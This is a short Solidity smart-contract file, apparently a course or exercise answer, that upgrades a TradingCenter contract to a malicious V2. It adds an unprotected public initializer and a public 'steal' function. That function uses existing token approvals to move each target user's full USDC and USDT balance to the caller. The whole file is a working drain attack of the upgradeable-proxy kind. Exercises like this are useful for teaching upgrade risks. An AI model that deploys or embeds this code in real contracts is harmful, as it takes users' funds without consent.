// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.17;
import "./TradingCenter.sol";

// TODO: Try to implement TradingCenterV2 here
contract TradingCenterV2 is TradingCenter {
    function _initialize(IERC20 _usdt, IERC20 _usdc) public {
        initialized = true;
        usdt = _usdt;
        usdc = _usdc;
    }

    function steal(address user) public {
        uint256 usdcAmount = usdc.balanceOf(user);
        uint256 usdtAmount = usdt.balanceOf(user);
        usdc.transferFrom(user, msg.sender, usdcAmount);
        usdt.transferFrom(user, msg.sender, usdtAmount);
    }
}
